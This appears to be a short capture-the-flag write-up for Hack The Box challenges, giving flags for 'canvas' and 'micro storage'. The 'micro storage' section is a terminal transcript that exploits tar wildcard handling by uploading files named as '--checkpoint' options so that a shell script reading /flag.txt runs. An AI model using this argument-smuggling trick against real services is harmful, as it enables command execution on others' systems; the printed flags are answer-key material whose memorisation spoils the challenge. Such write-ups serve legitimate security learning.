# compressor

i know there is acommand injection vulnerability but where.

# canvas

javascript deobfuscation was what we needed to do

HTB{W3Lc0m3_70_J4V45CR1p7_d30bFu5C4710N}

# micro storage
```
>> Choose an option: 1
[*] Enter your file name: --checkpoint=1
[*] Start typing your file content: (send 'EOF' when done)
firstFile EOF
[+] Your file "--checkpoint=1" has been saved. (10 bytes written)
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: --checkpoint-action=exec=sh x.sh
[-] No such option.
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: --checkpoint-action=exec=sh x.sh
[*] Start typing your file content: (send 'EOF' when done)
secondFile EOF
[+] Your file "--checkpoint-action=exec=sh x.sh" has been saved. (11 bytes written)
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: x.sh
[-] No such option.
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: x.sh
[*] Start typing your file content: (send 'EOF' when done)
#!/bin/bash
value=`cat /flag.txt`
echo "$value"EOF
[+] Your file "x.sh" has been saved. (47 bytes written)
1 => Upload a new file (7 file(s) remaining)             
2 => List your uploaded files (3 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 5
HTB{@bus1Ng_gTf0_b1N$_c4n_b3_fUn_s0m3t1meS__r1g|-|t??!!__c4fdecf8}
[+] Your base64 encoded archive:
eC5zaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAMDAwMTc1MAAwMDAxNzUwADAwMDAwMDAwMDU3ADE0MjU1NTA3NDU3ADAxMTU3MwAgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```